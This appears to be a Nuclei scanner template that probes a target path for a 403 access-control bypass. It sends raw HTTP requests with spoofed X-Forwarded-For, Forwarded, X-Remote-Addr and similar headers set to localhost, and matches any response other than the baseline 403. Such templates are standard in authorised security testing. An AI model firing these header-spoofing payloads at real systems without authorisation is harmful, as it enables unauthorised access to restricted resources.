id: x-forwarded-headers-403-bypass

info:
  name: x-forwarded-headers-403-bypass
  author: aufzayed
  severity: info
  description: x-forwarded-headers 403 bypass
  tags: fuzz

requests:
  - raw:
    - |+
      GET {{Path}} HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
      Referer: {{BaseURL}}
      Origin: {{RootURL}}
      Connection: Close
    
    - |+
      GET {{Path}} HTTP/1.1
      Host: {{Hostname}}
      X-Forwarded-For: 0.0.0.0
      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
      Referer: {{BaseURL}}
      Origin: {{RootURL}}
      Connection: Close
    
    - |+
      GET {{Path}} HTTP/1.1
      Host: {{Hostname}}
      X-forwarded-For:
      X-Forwarded-For: 127.0.0.1
      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
      Referer: {{BaseURL}}
      Origin: {{RootURL}}
      Connection: Close
    
    - |+
      GET {{Path}} HTTP/1.1
      Host: {{Hostname}}
      X_Forwarded_For: 127.0.0.1
      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
      Referer: {{BaseURL}}
      Origin: {{RootURL}}
      Connection: Close
    
    - |+
      GET {{Path}} HTTP/1.1
      Host: {{Hostname}}
      X-Forwarded-For: 127.0.0.1\r
      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
      Referer: {{BaseURL}}
      Origin: {{RootURL}}
      Connection: Close
    
    - |+
      GET {{Path}} HTTP/1.1
      Host: {{Hostname}}
      Forwarded: for=127.0.0.1
      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
      Referer: {{BaseURL}}
      Origin: {{RootURL}}
      Connection: Close
    
    - |+
      GET {{Path}} HTTP/1.1
      Host: {{Hostname}}
      X-Remote-Addr: 127.0.0.1
      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
      Referer: {{BaseURL}}
      Origin: {{RootURL}}
      Connection: Close
    
    - |+
      GET {{Path}} HTTP/1.1
      Host: {{Hostname}}
      X-Host: 127.0.0.1
      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
      Referer: {{BaseURL}}
      Origin: {{RootURL}}
      Connection: Close
    
    - |+
      GET {{Path}} HTTP/1.1
      Host: {{Hostname}}
      X-Forwarded-Host: 127.0.0.1
      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
      Referer: {{BaseURL}}
      Origin: {{RootURL}}
      Connection: Close
    - |+
      GET {{Path}} HTTP/1.1
      Host: {{Hostname}}
      X-Forwarded-By: 127.0.0.1
      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
      Referer: {{BaseURL}}
      Origin: {{RootURL}}
      Connection: Close
    unsafe: true
    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 403 && status_code_2 != 403"
          - "status_code_1 == 403 && status_code_3 != 403"
          - "status_code_1 == 403 && status_code_4 != 403"
          - "status_code_1 == 403 && status_code_5 != 403"
          - "status_code_1 == 403 && status_code_6 != 403"
          - "status_code_1 == 403 && status_code_7 != 403"
          - "status_code_1 == 403 && status_code_8 != 403"
          - "status_code_1 == 403 && status_code_9 != 403"
          - "status_code_1 == 403 && status_code_10 != 403"
